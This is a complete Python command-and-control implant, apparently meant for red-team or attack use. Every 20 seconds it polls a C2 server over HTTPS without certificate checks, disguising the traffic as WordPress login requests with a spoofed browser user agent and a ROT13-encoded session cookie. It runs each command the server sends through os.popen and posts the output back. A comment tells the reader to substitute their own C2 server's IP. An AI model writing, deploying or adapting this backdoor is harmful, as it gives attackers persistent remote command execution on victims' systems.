import os, ssl, time, http.client, string

trantab = str.maketrans("ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz","NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")
# chars = string.ascii_letters + string.digits
value = "6Q2HydryJknyIyyVv8Om"
session_value = value.translate(trantab)
header = {'cookie':'session = ' + value, 'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36'}

def callback():
    # change 172.16.69.132 with IP of your c2 server
    c2_connection = http.client.HTTPSConnection('172.16.69.136', timeout=10, context=ssl._create_unverified_context())
    c2_connection.request("GET", "/wp-login.php", headers=header)
    cmd = c2_connection.getresponse().read().decode()
    if cmd:
        results = (os.popen(str(cmd)).read()) + session_value
        c2_connection.request("POST", "", results)
        c2_connection.close()


while 1:
    callback()
    time.sleep(20)
